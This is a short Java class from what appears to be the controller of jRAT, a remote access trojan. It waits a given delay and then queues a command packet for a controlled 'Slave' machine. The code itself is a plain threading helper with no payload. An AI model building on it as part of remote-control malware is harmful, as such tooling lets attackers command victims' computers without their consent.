package jrat.controller.threads;

import jrat.controller.Slave;
import jrat.controller.packets.outgoing.OutgoingPacket;

public class ThreadDelayedCommand extends Thread {

	private Slave slave;
	private OutgoingPacket packet;
	private long ms;

	private ThreadDelayedCommand(Slave slave, OutgoingPacket packet, long ms) {
		super("Delayed thread");
		this.slave = slave;
		this.packet = packet;
		this.ms = ms;
	}

	public void run() {
		try {
			Thread.sleep(ms);
			slave.addToSendQueue(packet);
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

	public static ThreadDelayedCommand start(Slave slave, OutgoingPacket packet, long ms) {
		ThreadDelayedCommand cmd = new ThreadDelayedCommand(slave, packet, ms);
		cmd.start();
		return cmd;
	}

}
